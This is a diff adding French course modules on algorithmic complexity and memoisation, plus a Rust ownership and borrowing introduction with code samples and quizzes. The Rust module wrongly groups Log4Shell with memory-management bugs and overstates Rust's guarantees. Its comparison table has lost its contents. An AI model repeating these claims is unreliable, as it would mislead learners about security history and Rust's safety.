+ for i in range(len(lst)):
+ for j in range(i + 1, len(lst)): # Boucle dans une boucle = n²
+ if lst[i] == lst[j]:
+ doublons.add(lst[i])
+ return doublons
+# 100 000 éléments → ~5 milliards d'opérations
+
+# O(n log n) — Tri puis comparaison
+def doublons_tri(lst: list) -> set:
+ trie = sorted(lst) # O(n log n)
+ doublons = set()
+ for i in range(1, len(trie)): # O(n)
+ if trie[i] == trie[i-1]:
+ doublons.add(trie[i])
+ return doublons
+# 100 000 éléments → ~1.7 million d'opérations
+
+# O(n) — Table de hachage
+def doublons_optimal(lst: list) -> set:
+ vus = set()
+ doublons = set()
+ for element in lst: # Une seule passe = O(n)
+ if element in vus: # Lookup set = O(1)
+ doublons.add(element)
+ vus.add(element)
+ return doublons
+# 100 000 éléments → 100 000 opérations
+```
+
+---
+
+## Programmation Dynamique : Mémoïser pour Ne Pas Recalculer
+
+```python
+# Fibonacci naïf : O(2ⁿ)
+def fib_naive(n):
+ if n <= 1: return n
+ return fib_naive(n-1) + fib_naive(n-2)
+# fib(40) → 2 milliards d'appels récursifs !
+
+# Fibonacci avec mémoïsation : O(n)
+from functools import lru_cache
+
+@lru_cache(maxsize=None) # Cache automatique
+def fib_memo(n):
+ if n <= 1: return n
+ return fib_memo(n-1) + fib_memo(n-2)
+# fib(40) → 40 appels. Chaque résultat calculé une seule fois.
+print(fib_memo(100)) # 354224848179261915075 — instantané !
+```
+    """
+    codeblock "python" {
+      title: "Benchmark — comparaison des complexités Big-O"
+      code """
+import time
+import random
+
+def mesurer(func, data):
+    debut = time.perf_counter()
+    resultat = func(data)
+    return (time.perf_counter() - debut) * 1000  # ms
+
+# Génération des données
+def gen_liste(n):
+    lst = list(range(n))
+    random.shuffle(lst)
+    # Ajouter 10% de doublons
+    doublons = random.choices(lst[:n//2], k=n//10)
+    lst.extend(doublons)
+    return lst
+
+# Implémentations
+def O_n2(lst):
+    doublons = set()
+    for i in range(min(len(lst), 5000)):  # Limité à 5000 pour éviter crash
+        for j in range(i + 1, min(len(lst), 5000)):
+            if lst[i] == lst[j]:
+                doublons.add(lst[i])
+    return doublons
+
+def O_n_logn(lst):
+    trie = sorted(lst)
+    return {trie[i] for i in range(1, len(trie)) if trie[i] == trie[i-1]}
+
+def O_n(lst):
+    vus, doublons = set(), set()
+    for x in lst:
+        (doublons if x in vus else vus).add(x)
+    return doublons
+
+# Comparaison
+print(f"{'Taille':>8} | {'O(n²) ms':>10} | {'O(n log n) ms':>14} | {'O(n) ms':>8}")
+print("-" * 50)
+
+for n in [1000, 5000, 10000, 50000]:
+    data = gen_liste(n)
+    t_n2    = mesurer(O_n2, data) if n <= 5000 else float('inf')
+    t_nlogn = mesurer(O_n_logn, data)
+    t_n     = mesurer(O_n, data)
+    print(f"{n:>8} | {t_n2:>10.2f} | {t_nlogn:>14.2f} | {t_n:>8.2f}")
+
+# Résultat typique :
+# Taille |  O(n²) ms | O(n log n) ms |  O(n) ms
+# --------------------------------------------------
+#   1000 |      2.50 |          0.15 |     0.05
+#   5000 |     65.00 |          1.20 |     0.25
+#  10000 |       inf |          2.80 |     0.50  (n² trop lent)
+#  50000 |       inf |         16.00 |     2.50
+      """
+    }
+    quiz {
+      question "Une fonction avec une double boucle 'for i in range(n): for j in range(n)' a quelle complexité ?" {
+        - "O(n)"
+        - "O(n log n)"
+        + "O(n²)"
+        - "O(2n)"
+        explanation "Chaque élément est comparé avec chaque autre élément : n × n = n² opérations. Cela devient impraticable pour n > 100 000."
+      }
+      question "Quel est l'avantage principal de la mémoïsation (memoization) ?" {
+        - "Elle réduit l'utilisation de la RAM"
+        + "Elle évite de recalculer des résultats déjà calculés en les mettant en cache"
+        - "Elle parallélise les calculs sur plusieurs cœurs"
+        - "Elle compresse les données automatiquement"
+      }
+    }
+  }
+
+}
+
+course "rust-intro" {
+  title: "Rust : Le Code qui Ne Crash Jamais"
+  description: "Le langage qui garantit la sécurité mémoire sans garbage collector. Ownership, borrowing, lifetimes — comprends pourquoi Rust remplace C++ dans les systèmes critiques."
+  category: programming
+  level: advanced
+  duration: "6h"
+  icon: Memory
+  keywords: [rust, mémoire, ownership, système, performance, sécurité, concurrence]
+
+  module "pourquoi-rust" {
+    title: "Pourquoi Rust Existe : L'Histoire d'un Bug à 1 Milliard $"
+    duration: 25min
+    content """
+# Le Bug qui a Changé l'Industrie
+
+En 2014, Heartbleed. Une vulnérabilité dans OpenSSL (C) due à un **buffer overread** : le programme lisait de la mémoire au-delà de ce qu'il avait le droit. Résultat : les clés privées SSL de la moitié d'Internet exposées.
+
+En 2017, WannaCry. En 2021, Log4Shell. À chaque fois, la même catégorie de bugs : **erreurs de gestion mémoire** — buffer overflow, use-after-free, null pointer dereference.
+
+**70% des vulnérabilités critiques** chez Microsoft et Google sont des bugs mémoire. En C/C++, c'est inévitable. En Rust, c'est **impossible par design**.
+
+---
+
+## L'Ownership : La Règle Révolutionnaire
+
+Rust a une règle simple que le compilateur vérifie à la compilation :
+
+```
+1. Chaque valeur a UN seul propriétaire (owner)
+2. Quand le propriétaire sort de scope, la valeur est libérée
+3. Il ne peut y avoir qu'un seul propriétaire à la fois
+```
+
+```rust
+fn main() {
+ let s1 = String::from("hello"); // s1 est propriétaire
+ let s2 = s1; // L'ownership passe à s2
+
+ // println!("{}", s1); // ERREUR DE COMPILATION !
+ // s1 n'est plus valide. Rust empêche le use-after-move.
+ println!("{}", s2); // OK
+} // s2 est libéré ici. Automatiquement. Sans garbage collector.
+```
+
+---
+
+## Borrowing : Emprunter Sans Posséder
+
+```rust
+fn longueur(s: &String) -> usize { // & = référence (emprunt)
+ s.len()
+} // s est rendu, la String originale n'est PAS libérée
+
+fn main() {
+ let s = String::from("tutodecode");
+ let len = longueur(&s); // On passe une référence, pas l'ownership
+ println!("'{}' a {} caractères", s, len); // s est encore valide !
+}
+
+// RÈGLES DES RÉFÉRENCES (garantit la sécurité sans GC) :
+// À tout moment, SOIT :
+// → N références immuables (&T) — lecture seule, plusieurs OK
+// → 1 référence mutable (&mut T) — écriture, exclusif
+// Jamais les deux simultanément → impossible d'avoir des data races !
+```
+
+---
+
+## Rust vs Les Autres
+
+```
+ Vitesse Sécurité mémoire GC Concurrence sûre
+C 
+C++ 
+Java (partiel)
+Python (GIL)
+Rust 
+
+Rust = Performance de C + Sécurité de Python + Concurrence sans données corrompues
+```
+    """
+    codeblock "rust" {
+      title: "Rust en pratique — structures et gestion d'erreurs"
+      code """
+// Un programme Rust idiomatique : gestion d'erreurs propre
+use std::collections::HashMap;
+
+// Structure avec ownership automatique
+#[derive(Debug, Clone)]
+struct Etudiant {
+    nom: String,
+    scores: Vec<u32>,
+}
+
+impl Etudiant {
+    fn new(nom: &str) -> Self {
+        Etudiant {
+            nom: nom.to_string(),
+            scores: Vec::new(),
+        }
+    }
+    
+    fn ajouter_score(&mut self, score: u32) {
+        self.scores.push(score);
+    }
+    
+    fn moyenne(&self) -> Option<f64> {
+        if self.scores.is_empty() {
+            None  // Pas de panique, juste une valeur vide
+        } else {
+            let somme: u32 = self.scores.iter().sum();
+            Some(somme as f64 / self.scores.len() as f64)
+        }
+    }
+}
+
+// Gestion d'erreurs avec Result<T, E>
+#[derive(Debug)]
+enum ErreurPromo {
+    EtudiantInexistant(String),
+    ScoreInvalide(u32),
+}
+
+struct Promotion {
+    etudiants: HashMap<String, Etudiant>,
+}
+
+impl Promotion {
+    fn ajouter_score(
+        &mut self,
+        nom: &str,
+        score: u32,
+    ) -> Result<(), ErreurPromo> {
+        if score > 100 {
+            return Err(ErreurPromo::ScoreInvalide(score));
+        }
+        self.etudiants
+            .get_mut(nom)
+            .ok_or_else(|| ErreurPromo::EtudiantInexistant(nom.to_string()))?
+            .ajouter_score(score);
+        Ok(())
+    }
+}
+
+fn main() {
+    let mut promo = Promotion {
+        etudiants: HashMap::new(),
+    };
+    
+    promo.etudiants.insert(
+        "Alice".to_string(),
+        Etudiant::new("Alice")
+    );
+    
+    // Gestion d'erreur élégante avec match
+    match promo.ajouter_score("Alice", 95) {
+        Ok(()) => println!("Score ajouté !"),
+        Err(e) => println!("Erreur : {:?}", e),
+    }
+    
+    match promo.ajouter_score("Bob", 85) {
+        Ok(()) => println!("Score ajouté !"),
+        Err(ErreurPromo::EtudiantInexistant(nom)) => {
+            println!("Étudiant '{}' introuvable", nom);
+        }
+        Err(e) => println!("Erreur : {:?}", e),
+    }
+    
+    // Accès sécurisé avec pattern matching
+    if let Some(alice) = promo.etudiants.get("Alice") {
+        match alice.moyenne() {
+            Some(moy) => println!("{} : {:.1}/100", alice.nom, moy),
+            None => println!("Aucun score pour {}", alice.nom),
+        }
+    }
+}
+      """
+    }
+    quiz {
+      question "Quelle règle de l'ownership Rust empêche les use-after-free ?" {
+        + "Chaque valeur a un seul propriétaire, libérée quand il sort de scope"
+        - "Le garbage collector détecte les accès invalides"
+        - "Toutes les variables sont copiées automatiquement"
+        - "Les pointeurs nuls sont interdits par convention"
+        explanation "Quand l'owner sort de scope, la mémoire est libérée. Si tu essaies d'utiliser la valeur après, le compilateur refuse à la compilation — aucune vérification à l'exécution nécessaire."
+      }
+      question "En Rust, peut-on avoir simultanément une référence mutable et une référence immuable sur la même donnée ?" {
+        - "Oui, si on utilise unsafe{}"
+        - "Oui, c'est le comportement par défaut"
+        + "Non, jamais — le compilateur interdit ce cas"
+        - "Oui, mais seulement en lecture"
+        explanation "La règle du borrow checker : soit N références immuables, soit UNE seule référence mutable. Jamais les deux simultanément. Cela garantit l'absence de data races à la compilation."
+      }
+    }
+  }
+
+}
